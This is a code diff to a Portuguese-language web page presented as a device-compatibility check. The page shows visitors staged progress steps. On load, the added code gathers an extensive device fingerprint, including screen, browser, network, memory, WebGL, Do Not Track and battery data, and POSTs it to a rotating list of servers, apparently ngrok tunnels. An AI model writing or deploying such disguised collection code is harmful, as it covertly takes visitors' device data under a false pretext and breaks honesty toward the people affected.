@@ -254,6 +254,13 @@
             opacity: 0.6;
             margin-top: 20px;
         }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 15px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -298,6 +305,10 @@
                         <div class="step-text">Finalizando verificação</div>
                     </div>
                 </div>
+
+                <div class="error-message" id="errorMessage">
+                    Erro ao conectar com o servidor. Verificando alternativas...
+                </div>
                 
                 <div class="session-info">
                     Sessão: <span id="sessionId"></span>
@@ -314,9 +325,14 @@
                     Seu dispositivo é totalmente compatível com nossos recursos. 
                     Todas as funcionalidades estão disponíveis e funcionando perfeitamente.
                 </div>
-                <button class="continue-button" onclick="redirectToApp()">
+                <button class="continue-button" id="continueButton">
                     Continuar para o Aplicativo
                 </button>
+
+                <div class="session-info">
+                    Sessão: <span id="finalSessionId"></span> | 
+                    Status: <span id="serverStatus">Dados enviados com sucesso</span>
+                </div>
             </div>
         </div>
     </div>
@@ -336,8 +352,11 @@
         
         const sessionId = generateSessionId();
         document.getElementById('sessionId').textContent = sessionId;
+        document.getElementById('finalSessionId').textContent = sessionId;
         
         let currentStep = 0;
+        let currentServerIndex = 0;
+        let dataSentSuccessfully = false;
         
         // Obter o IP público usando uma API externa
         async function getPublicIP() {
@@ -352,10 +371,35 @@
         }
         
         // Função para fazer requisições com headers personalizados
-        function customFetch(url, options = {}) {
-            options.headers = options.headers || {};
-            options.headers["ngrok-skip-browser-warning"] = "true";
-            return fetch(url, options);
+        async function customFetch(endpoint, data) {
+            // Tentar cada servidor até encontrar um que funcione
+            for (let i = 0; i < SERVER_URLS.length; i++) {
+                const serverUrl = SERVER_URLS[i];
+                try {
+                    const response = await fetch(serverUrl + endpoint, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                            "ngrok-skip-browser-warning": "true"
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    if (response.ok) {
+                        console.log(`Dados enviados com sucesso para ${serverUrl}`);
+                        currentServerIndex = i; // Usar este servidor para próximas requisições
+                        return true;
+                    } else {
+                        console.error(`Erro do servidor ${serverUrl}:`, response.status);
+                    }
+                } catch (error) {
+                    console.error(`Erro ao conectar com ${serverUrl}:`, error);
+                }
+            }
+            
+            // Se nenhum servidor respondeu, mostrar mensagem de erro
+            document.getElementById('errorMessage').style.display = 'block';
+            return false;
         }
 
         // Coleta de informações do dispositivo
@@ -371,7 +415,8 @@
                         width: screen.width,
                         height: screen.height,
                         colorDepth: screen.colorDepth,
-                        pixelRatio: window.devicePixelRatio
+                        pixelRatio: window.devicePixelRatio,
+                        orientation: screen.orientation ? screen.orientation.type : 'unknown'
                     },
                     browser: {
                         userAgent: navigator.userAgent,
@@ -382,7 +427,9 @@
                         onLine: navigator.onLine,
                         hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                         maxTouchPoints: navigator.maxTouchPoints || 0,
-                        vendor: navigator.vendor || 'unknown'
+                        vendor: navigator.vendor || 'unknown',
+                        javaEnabled: navigator.javaEnabled(),
+                        doNotTrack: navigator.doNotTrack || 'unspecified'
                     },
                     window: {
                         width: window.innerWidth,
@@ -399,56 +446,85 @@
                             effectiveType: navigator.connection.effectiveType,
                             downlink: navigator.connection.downlink,
                             rtt: navigator.connection.rtt,
-                            saveData: navigator.connection.saveData
+                            saveData: navigator.connection.saveData,
+                            type: navigator.connection.type || 'unknown'
                         } : 'unavailable'
                     },
                     media: {
                         deviceMemory: navigator.deviceMemory || 'unknown',
                         touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-                        pdfViewer: navigator.pdfViewerEnabled || false
+                        pdfViewer: navigator.pdfViewerEnabled || false,
+                        webGL: (() => {
+                            try {
+                                const canvas = document.createElement('canvas');
+                                return !!(window.WebGLRenderingContext && 
+                                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
+                            } catch (e) {
+                                return false;
+                            }
+                        })()
                     },
                     storage: {
                         localStorage: typeof(Storage) !== "undefined",
                         sessionStorage: typeof(Storage) !== "undefined",
                         cookies: navigator.cookieEnabled
+                    },
+                    performance: {
+                        memory: window.performance && performance.memory ? {
+                            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                            totalJSHeapSize: performance.memory.totalJSHeapSize,
+                            usedJSHeapSize: performance.memory.usedJSHeapSize
+                        } : 'unavailable'
                     }
                 };
 
+                // Informações de bateria (se disponível)
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        deviceInfo.battery = {
+                            charging: battery.charging,
+                            level: battery.level * 100,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (e) {
+                        console.log("Não foi possível acessar informações da bateria");
+                    }
+                }
+
                 // Enviar dados para o servidor
-                customFetch("/device_info", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(deviceInfo)
-                }).catch(error => {
-                    console.log("Erro ao enviar informações:", error);
-                });
+                dataSentSuccessfully = await customFetch("/device_info", deviceInfo);
+                
+                if (!dataSentSuccessfully) {
+                    document.getElementById('serverStatus').textContent = "Falha no envio dos dados";
+                    document.getElementById('serverStatus').style.color = "#dc3545";
+                }
+                
             } catch (error) {
-                console.log("Erro ao coletar informações:", error);
+                console.error("Erro ao coletar informações:", error);
+                dataSentSuccessfully = false;
+                document.getElementById('serverStatus').textContent = "Erro na coleta de dados";
+                document.getElementById('serverStatus').style.color = "#dc3545";
             }
         }
 
         const steps = [
             {
                 text: "Verificando navegador e sistema operacional...",
-                duration: 1500,
-                action: () => {} // Ação vazia, a coleta é feita separadamente
+                duration: 1500
             },
             {
                 text: "Coletando informações técnicas...",
-                duration: 2000,
-                action: () => {}
+                duration: 2000
             },
             {
                 text: "Verificando conectividade...",
-                duration: 1500,
-                action: () => {}
+                duration: 1500
             },
             {
                 text: "Finalizando verificação...",
-                duration: 1500,
-                action: () => {}
+                duration: 1500
             }
         ];
         
@@ -473,9 +549,6 @@
             // Marcar step como ativo
             const stepElement = document.getElementById(`progress-step${currentStep + 1}`);
             stepElement.classList.add('active');
-            
-            // Executar ação do step (se houver)
-            if (step.action) step.action();
             
             // Simular progresso
             const targetProgress = ((currentStep + 1) / steps.length) * 100;
@@ -535,8 +608,9 @@
         window.addEventListener('load', function() {
             startVerification();
         });
+        
+        // Adicionar event listener para o botão de continuar
+        document.getElementById('continueButton').addEventListener('click', redirectToApp);
     </script>
 </body>
 </html>
-
-
